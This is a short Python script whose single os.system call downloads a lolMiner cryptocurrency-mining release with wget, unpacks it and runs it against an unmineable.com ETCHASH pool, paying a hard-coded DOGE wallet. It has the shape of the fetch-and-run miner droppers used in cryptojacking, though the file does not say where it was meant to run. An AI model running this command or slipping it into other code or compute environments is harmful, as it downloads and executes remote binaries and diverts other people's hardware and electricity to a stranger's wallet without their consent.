import os

command = "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && ./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+tcp://etchash.unmineable.com:3333 --user DOGE:DA6CNXPGacPWBTLrVq3b1b9uhpWiH1QWda.nemo99#3m34-lfsa"
os.system(command)
